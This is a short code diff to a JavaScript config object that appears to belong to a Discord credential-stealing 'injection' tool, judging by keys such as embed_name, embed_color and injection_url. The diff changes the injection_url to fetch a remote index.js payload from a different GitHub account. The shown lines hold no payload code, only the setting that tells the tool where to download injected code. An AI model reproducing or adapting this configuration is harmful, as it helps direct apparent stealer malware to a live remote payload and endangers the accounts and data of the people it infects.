@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Injection', 
   embed_icon: '', 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/AlfaPuding/injection/main/index.js', 
   /**
    
    **/
